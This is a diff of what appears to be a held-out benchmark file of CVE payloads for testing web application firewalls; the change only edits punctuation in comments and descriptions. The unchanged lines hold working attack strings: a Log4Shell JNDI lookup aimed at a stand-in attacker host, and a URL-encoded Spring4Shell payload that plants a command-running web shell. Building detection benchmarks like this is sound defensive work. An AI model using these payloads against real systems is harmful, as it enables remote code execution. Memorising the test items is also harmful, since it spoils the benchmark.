@@ -5,7 +5,7 @@ schema = 1
 # They are the test set. If something is added here, it does NOT get
 # referenced in rules/, gene-bank seed files, or strategy code.
 #
-# Web/RCE-flavored CVE shapes — the canonical "did it actually fire?"
+# Web/RCE-flavored CVE shapes (the canonical "did it actually fire)?"
 # checks for production WAFs. Most of these are textually distinct from
 # the train-set payloads in ../sql/, ../xss/, etc. so the bench is
 # measuring true generalization, not memorization.
@@ -14,7 +14,7 @@ schema = 1
 id = "cve_2021_44228_log4shell_basic"
 class = "log4shell"
 payload = "${jndi:ldap://attacker.example.com/a}"
-description = "Log4j JNDI lookup — original disclosure shape"
+description = "Log4j JNDI lookup, original disclosure shape"
 
 [[case]]
 id = "cve_2021_44228_log4shell_obfuscated"
@@ -75,7 +75,7 @@ description = "Confluence OGNL injection in template macro"
 id = "cve_2022_22965_spring4shell"
 class = "ssti"
 payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
-description = "Spring4Shell — class.module.classLoader manipulation"
+description = "Spring4Shell, class.module.classLoader manipulation"
 
 [[case]]
 id = "cve_2017_5715_ssrf_postgres"
